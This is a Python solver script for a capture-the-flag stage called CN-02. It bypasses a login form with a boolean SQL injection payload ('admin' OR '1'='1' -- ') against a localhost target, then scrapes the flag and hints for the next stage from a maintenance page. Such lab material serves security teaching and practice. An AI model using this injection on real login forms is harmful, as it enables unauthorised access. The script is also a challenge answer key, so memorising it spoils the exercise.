#!/usr/bin/env python3
"""
CN-02 SQL injection solver.

Bypasses the login form's boolean-based SQL injection, follows the
redirect to the maintenance page, and extracts the stage flag plus the
Base64/Vigenere-encoded string for CN-03.

Requires: pip install requests
"""
import argparse
import re

import requests


def main():
    parser = argparse.ArgumentParser(description="CN-02 SQL injection solver")
    parser.add_argument("--url", default="http://localhost:8080/cn02/")
    args = parser.parse_args()

    base = args.url.rstrip("/") + "/"
    session = requests.Session()

    payload = {"username": "admin' OR '1'='1' -- ", "password": "anything"}
    print(f"[*] Sending SQL injection payload to {base}")
    login_resp = session.post(base, data=payload, allow_redirects=False, timeout=10)

    if login_resp.status_code not in (301, 302, 303, 307, 308):
        raise SystemExit(f"[!] Expected a redirect, got {login_resp.status_code}. Injection may have failed.")

    maint_url = base + "maintenance"
    print(f"[*] Authenticated. Fetching {maint_url}")
    maint_resp = session.get(maint_url, timeout=10)
    maint_resp.raise_for_status()

    text = maint_resp.text

    flag_match = re.search(r"CipherNest\{[^}]+\}", text)
    encoded_match = re.search(r"Encoded config:\s*([A-Za-z0-9+/=]+)", text)
    key_match = re.search(r"Keyword used by the ops team[^:]*:\s*(\S+)", text)

    print("\n----- maintenance page -----")
    print(text.strip())
    print("-----------------------------\n")

    if flag_match:
        print(f"[FLAG] {flag_match.group(0)}")
    else:
        print("[!] No CipherNest{...} flag found on the maintenance page.")

    if encoded_match:
        print(f"[CN-03 encoded string] {encoded_match.group(1)}")
    if key_match:
        print(f"[CN-03 key hint] {key_match.group(1)}")


if __name__ == "__main__":
    main()
